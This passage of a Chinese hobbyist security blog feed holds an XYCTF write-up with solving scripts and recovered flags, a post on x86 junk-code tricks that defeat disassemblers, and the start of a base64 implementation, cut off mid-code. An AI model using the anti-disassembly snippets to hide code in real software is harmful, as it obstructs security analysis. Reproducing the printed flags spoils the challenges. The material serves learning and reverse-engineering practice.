class="number">153383826085102296581238539677668696644156148059026868813759015106139131297135097831661048493079405226972222492151356105759235749502324303047037349410709021152255315429280760639113724345836532087970918453353723090554450581657930847674930226113840172368662838756446364482977092478979838209396761279326533419699056209983721842484996150025403009644653678928025861445324715419893797015875541525590135843027312322236085581571452084477262582966972702577136904385741443870527205640874446616413917231260133364227248928492574610248881137364204914001412269740461851747883355414968499272944590071623223603501698004227753335552646715567802825755799597955409228004284739743749531270833084850113574712041224896044525292591264637452797151098802604186311724597450780520140413704697374209653369969451501627583467893160412780732575085846467289134920886789952338174193202234175299652687560232593212131693456966318670843605238958724126368185289703563591477049105538528244632434869965333722691837462591128379816582723367039674028619947057144546</span></span><br><span class="line"></span><br><span class="line">Srsa(p,q,e,c)<span class="comment"># 自己写的解密函数</span></span><br><span class="line"><span class="comment"># b&#x27;XYCTF&#123;7f4b2241951976ce5ef6df44503209059997e5085d1bc21f6bef4d9effb29fd0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="week1-2"><a href="#week1-2" class="headerlink" title="week1"></a>week1</h3><h4 id="TCPL"><a href="#TCPL" class="headerlink" title="TCPL"></a>TCPL</h4><p>拖入ida分析，，发现只是异或了i，得到没有替换的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x7F</span>, <span class="number">0x55</span>, <span class="number">0x4A</span>, <span class="number">0x44</span>, <span class="number">0x5C</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x65</span>, <span class="number">0x38</span>, <span class="number">0x52</span>, <span class="number">0x7C</span>, <span class="number">0x3E</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x64</span>, <span class="number">0x4C</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0x62</span>, <span class="number">0x79</span>, <span class="number">0x77</span>, <span class="number">0x74</span>, <span class="number">0x2A</span>, <span class="number">0x61</span>]</span><br><span class="line">pxor(b)</span><br><span class="line"><span class="comment"># FLAG&#123;PLCT_An4_r1SCv_x1huann1&#125;</span></span><br></pre></td></tr></table></figure><p>把1换成其它值，多试一下</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;PLCT_A<span class="symbol">n4</span>_r<span class="number">0</span>SCv_x<span class="number">0</span>hua<span class="symbol">nn0</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="ez-隐写"><a href="#ez-隐写" class="headerlink" title="ez_隐写"></a>ez_隐写</h4><p>开头一个伪加密，改好了之后有一个hint.png和一个watermark.jpg的文件,但是water.jpg要解压,修改hint.png的长宽获得密码xyctf0401，然后解压watermark.jpg，用盲水印工具打开可得flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XYCTF</span>&#123;<span class="number">758</span>-W5X-IJN-<span class="number">852</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="修仙传"><a href="#修仙传" class="headerlink" title="修仙传"></a>修仙传</h4><h5 id="4元婴"><a href="#4元婴" class="headerlink" title="4元婴"></a>4元婴</h5><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">都<span class="number">2024</span>年了不会还有人解不出U<span class="number">2</span>FsdGVkX<span class="number">1</span>+y<span class="number">2</span>rlJZlJCM<span class="symbol">nvyDwHwzkgHvNsG2</span>TF<span class="number">6</span>sFlBlxBs<span class="number">0</span>w<span class="number">4</span>EmyXdDe<span class="number">6</span>s<span class="number">7</span>viL吧</span><br></pre></td></tr></table></figure><p>key: 2024 TripleDes解密得密码</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The<span class="number">_f</span>ourth<span class="number">_f</span>loor<span class="number">_</span><span class="keyword">is</span><span class="number">_</span>okay</span><br></pre></td></tr></table></figure><p>打开文件得到一个微信数据库文件和一个</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wqk：<span class="number">1</span><span class="name">m813</span>o<span class="symbol">nn17</span><span class="meta">o040358</span>p<span class="number">772</span>q<span class="number">37</span>r<span class="name">m137</span>qp<span class="symbol">nqppqpn38</span><span class="symbol">nr704</span><span class="name">m56</span><span class="symbol">n2</span><span class="name">m9</span>q<span class="number">22</span>p<span class="meta">o7</span>r<span class="number">05</span>r<span class="number">77</span></span><br></pre></td></tr></table></figure><p>修改其中的字符</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1A813CBB17C040358D772E37FA137EDBEDDEDB38BF704A56B2A9E22DC7F05F77</span><br></pre></td></tr></table></figure><p>直接用脚本解密aes即可</p><p><img src="https://s2.loli.net/2024/04/09/O4jcnmRQfHrpzWU.png" alt="image-20240409192304734"></p><h5 id="7合体"><a href="#7合体" class="headerlink" title="7合体"></a>7合体</h5><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密文：Tig+AF8-viakubq+AF8-vphrz+AF8-xi+AF8-uayzdyrjs</span><br><span class="line"></span><br><span class="line">听说维吉尼亚<span class="built_in">key</span>大残</span><br></pre></td></tr></table></figure><p>放到维吉尼亚解密里面，AF8指密钥和密文长度一样</p><p>假设密钥是ABCDEFGHIJKLMNOPQRST</p><p>得到密码</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The<span class="number">_</span>seventh<span class="number">_</span>level<span class="number">_</span><span class="keyword">is</span><span class="number">_</span>difficult</span><br></pre></td></tr></table></figure><p>得到一张颜色图片，8进制转换即可</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">they_were_thr0ugh!</span><br></pre></td></tr></table></figure><h5 id="8大乘"><a href="#8大乘" class="headerlink" title="8大乘"></a>8大乘</h5><p>开头是密码，直接用网上的异或加合脚本爆出来pq</p><p>然后rsa求密码</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pruning_algorithm</span></span><br></pre></td></tr></table></figure><p>出来是一个yesno文件</p><p>根据压缩包的提示把yes改成1，no改成0生成图片</p><p>内容是原神的文字，转换</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S<span class="name">m3</span>rt_y<span class="number">0</span>u_ca<span class="symbol">n_do</span></span><br></pre></td></tr></table></figure><h3 id="week3-1"><a href="#week3-1" class="headerlink" title="week3"></a>week3</h3><h4 id="我的二维码为啥扫不出来？"><a href="#我的二维码为啥扫不出来？" class="headerlink" title="我的二维码为啥扫不出来？"></a>我的二维码为啥扫不出来？</h4><p>根据定位点和时序图案还原</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line">import <span class="built_in">random</span></span><br><span class="line"></span><br><span class="line">def reverse_color(x):</span><br><span class="line">    <span class="built_in">return</span> <span class="number">0</span> <span class="keyword">if</span> x == <span class="number">255</span> <span class="keyword">else</span> <span class="number">255</span></span><br><span class="line"></span><br><span class="line">def reverse_row_colors(pixels, <span class="built_in">row</span>, <span class="built_in">width</span>, block_size=<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> x_block <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">width</span> // block_size):</span><br><span class="line">        x = x_block * block_size</span><br><span class="line">        y = <span class="built_in">row</span> * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line">def reverse_col_colors(pixels, <span class="built_in">col</span>, <span class="built_in">height</span>, block_size=<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> y_block <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">height</span> // block_size):</span><br><span class="line">        x = <span class="built_in">col</span> * block_size</span><br><span class="line">        y = y_block * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line">encrypted_img = Image.open(<span class="string">&quot;new.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">decrypted_img = encrypted_img.<span class="built_in">copy</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">width</span>, <span class="built_in">height</span> = decrypted_img.size</span><br><span class="line">pixels = decrypted_img.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse_row_colors(pixels, <span class="number">1</span>, <span class="built_in">width</span>)</span><br><span class="line">reverse_row_colors(pixels, <span class="number">12</span>, <span class="built_in">width</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse_col_colors(pixels, <span class="number">2</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">0</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">5</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">10</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">11</span>, <span class="built_in">height</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decrypted_img.<span class="built_in">save</span>(<span class="string">&quot;decrypted.png&quot;</span>)</span><br><span class="line"># flag&#123;qR_c0d3_1s_s0_fun&#125;</span><br></pre></td></tr></table></figure><h4 id="Rosk-Paper-Scissors"><a href="#Rosk-Paper-Scissors" class="headerlink" title="Rosk,Paper,Scissors!"></a>Rosk,Paper,Scissors!</h4><p>根据看ai的逻辑，发现是检索我出的最多的那个来判断这一次出什么，那就反制这个，写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">alist = [] </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_most_count</span>(<span class="params">alist</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = Counter(alist)</span><br><span class="line">        <span class="keyword">return</span> data.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = Counter(alist)</span><br><span class="line">            <span class="keyword">return</span> data.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Scissors&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> ==<span class="string">&#x27;Rock&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Paper&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> ==<span class="string">&#x27;Paper&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Scissors&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> == <span class="string">&#x27;Scissors&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Rock&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Rock&#x27;</span></span><br><span class="line"><span class="comment"># 创建一个socket对象</span></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到服务器</span></span><br><span class="line">client_socket.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">2137</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化上一次的选择为None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取并打印服务器的欢迎消息</span></span><br><span class="line">data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;接收到的数据: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># 游戏循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    this_choice = back(get_most_count(alist))</span><br><span class="line">    <span class="comment"># 发送选择</span></span><br><span class="line">    client_socket.send((this_choice + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">    <span class="built_in">print</span>(this_choice)</span><br><span class="line">    <span class="comment"># 等待一段时间以便服务器处理我们的输入</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取并打印服务器的响应</span></span><br><span class="line">    data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;接收到的数据: <span class="subst">&#123;data&#125;</span>&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据游戏的结果来更新上一次的选择或结束游戏</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;win&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        alist.append(this_choice)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        client_socket.close()</span><br><span class="line">        <span class="keyword">break</span>  <span class="comment"># 结束游戏循环</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭连接</span></span><br><span class="line">client_socket.close()</span><br><span class="line"><span class="comment"># XYCTF&#123;6e6e643f-8bf5-4d67-a0d7-be3a6d7cbedc&#125;</span></span><br><span class="line"><span class="comment"># 记不得了，大概是这个flag</span></span><br></pre></td></tr></table></figure><h4 id="美妙的歌声"><a href="#美妙的歌声" class="headerlink" title="美妙的歌声"></a>美妙的歌声</h4><p>用audacity打开，以频谱图模式观察，发现字符串：XYCTF_1s_w3ll</p><p>这个看起来不是flag，但是可能是其它东西，用deepsound打开，把这个当密码，得到flag.txt</p><p>内容是</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XYCTF&#123;T0uch_y0ur_he3rt_d55ply!!&#125;</span><br></pre></td></tr></table></figure><hr><p>总结：</p><p>re部分还是比较简单，基本没有什么问题<br>大部分是基础内容，没有ollvm和复杂的花也没有强的壳，<br>就直接分析逻辑或者动调就可以解，re还是偏简单的</p><p>类型：</p><p>两道flag不是输入的题：龙芯和白月光</p><p>其它都是直接逆向的题：</p><p>自定义逻辑</p><p>asm</p><p>伪vm</p><p>…</p><p>baby unity里面的工具在使用后会直接还原csharp方法名，在dumpdll文件夹中</p><p>cry部分会不了一点，不过密码✌要带我，太好了<br>之后问一下rsa的部分，还有复数域的内容</p><p>misc部分还是做的少了，要多练，不然好多没见过的<br>这次学到了音频，二维码和水印<br>以及总结一下nc题的做法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">2137</span>))</span><br><span class="line"><span class="comment"># 连接的方式</span></span><br><span class="line"></span><br><span class="line">data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line"><span class="comment"># 接受数据的方式</span></span><br><span class="line"></span><br><span class="line">client_socket.send((<span class="string">&quot;xxx&quot;</span>).encode())</span><br><span class="line"><span class="comment"># 上传的方式</span></span><br><span class="line"></span><br><span class="line">client_socket.close()</span><br><span class="line"><span class="comment"># 关闭的方式</span></span><br></pre></td></tr></table></figure><p>通过这个方法上传和解析服务器的数据并提交内容</p>]]></content>
    
    
    <summary type="html">打了一个月，终于打完了</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>花指令研究</title>
    <link href="https://www.pri87.vip/posts/9ffaa92b.html"/>
    <id>https://www.pri87.vip/posts/9ffaa92b.html</id>
    <published>2024-03-26T16:02:20.000Z</published>
    <updated>2024-06-06T16:06:09.376Z</updated>
    
    <content type="html"><![CDATA[<p>那天，我遇到了destination那道题，然后遇到了seh和花指令。<br>然后，我苦思冥想，还是不会，遂问出题人，出题人曰：菜就多练。于是本篇博客就出现了。</p><p>参考：[<a href="https://bbs.kanxue.com/thread-279604.htm#msg_header_h2_10">原创][花指令]由易到难全面解析CTF中的花指令-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>先了解一下花指令：</p><p>花指令是专门针对静态分析的。且不在意逆向工程师可不可以看出来，关键在于让工程师逆不出来。对于动态调试，就要看情况了，有的可以直接出来，有的又搞不出来。</p><hr><p>反编译器的编译方法：</p><p>递归下降+线性扫描：</p><ul><li>从入口开始依次解析指令+遇到分支指令会递归进入分支进行反编译</li></ul><p>错误原理：</p><ul><li>机器码长度不固定，插入一个有指令作用的数据会导致其被解析成指令随后的n个字节会被解释为操作数，这样之后的内容就无法反编译了</li></ul><hr><p>花指令分为两种：</p><p>被执行的花指令和不被执行的花指令</p><p>不被执行的花指令如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__asm&#123;</span><br><span class="line">jmp Label1</span><br><span class="line">db junkcode</span><br><span class="line">Label1:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种jmp的可以直接nop掉（不过这个会被直接识别出来）</p><p>可以这样：</p><p>jmp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">asm</span><br><span class="line">&#123;</span><br><span class="line">  Jz Label</span><br><span class="line">  Jnz Label</span><br><span class="line">  Db thunkcode;垃圾数据</span><br><span class="line">Label:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>永恒跳转，但是ida无法识别</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm&#123;</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">ebx</span>,<span class="built_in">ebx</span></span><br><span class="line">    <span class="keyword">test</span> <span class="built_in">ebx</span>,<span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">    jnz label</span>1</span><br><span class="line"><span class="symbol">    jz label</span>2</span><br><span class="line"><span class="symbol">label1:</span></span><br><span class="line">    _emit junkcode</span><br><span class="line"><span class="symbol">label2:</span></span><br><span class="line">   <span class="keyword">pop</span> <span class="built_in">ebx</span>//需要恢复<span class="built_in">ebx</span>寄存器   </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">__asm&#123;</span><br><span class="line">    <span class="keyword">clc</span></span><br><span class="line"><span class="symbol">    jnz label</span>1:</span><br><span class="line">    _emit junkcode</span><br><span class="line"><span class="symbol">label1:</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同永恒跳转，不过使用test强制转换标志位</p><p>call&amp;ret:</p><blockquote><p>call指令的本质：push eip，然后jmp 函数地址</p><p>ret指令的本质：pop eip</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">call LABEL9;</span><br><span class="line">_emit 0x83;</span><br><span class="line">LABEL9:</span><br><span class="line">add dword ptr ss : [esp] , 8;给栈中的eip加8，直接跳过这几条语句</span><br><span class="line">ret;</span><br><span class="line">__emit 0xF3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么来详细了解一下call</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">call near xxx;默认为near，可省，相对下一条指令位置调用函数（段不变）</span><br><span class="line">E8 xx xx;</span><br><span class="line"></span><br><span class="line">call ax;间接绝对近距离调用</span><br><span class="line">call [addr];间接绝对近距离调用</span><br><span class="line">ff xx;</span><br><span class="line"></span><br><span class="line">call far 段基址:段内偏移;直接绝对远距离调用,可以不加far,返回必须用retf</span><br><span class="line">0x9a xx xx xx xx;前2字节是段内偏移，后2字节是段基址,这种情况下，CS和ip均要压栈</span><br><span class="line"></span><br><span class="line">call far [addr];间接绝对远距离调用</span><br><span class="line">ff1e xx xx xx xx;前2字节是段内偏移，后2字节是段基址</span><br></pre></td></tr></table></figure><hr><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>这之上是我一开始对花指令的了解，但是随着我出了flower_tea这道题之后，我对花指令有了（感觉上）更深的看法</p><p>花指令junk_code的目的：</p><p>针对反编译器，干扰反编译器使其无法解析指令，只能用机器码表示。再者就是考虑针对反编译器特性，选择构造结构让它们不能把对应代码识别成一个函数</p>]]></content>
    
    
    <summary type="html">那是一个晚上</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>base64实现</title>
    <link href="https://www.pri87.vip/posts/2c2fa1f6.html"/>
    <id>https://www.pri87.vip/posts/2c2fa1f6.html</id>
    <published>2024-03-22T10:51:36.000Z</published>
    <updated>2024-03-22T11:03:47.665Z</updated>
    
    <content type="html"><![CDATA[<p>最近在复习，把写的base64发在这里</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;String&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">en</span><span class="params">(std::string str)</span> </span>&#123;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> string table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br><span class="line">std::vector&lt;<span class="type">uint8_t</span>&gt; input;</span><br><span class="line">std::vector&lt;<span class="type">uint8_t</span>&gt; output;</span><br><span class="line"><span class="comment">//初始化input</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c : str) &#123;</span><br><span class="line">input.<span class="built_in">push_back</span>(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//长度检查</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> len_before = str.<span class="built_in">length</span>();</span><br><span class="line"><span 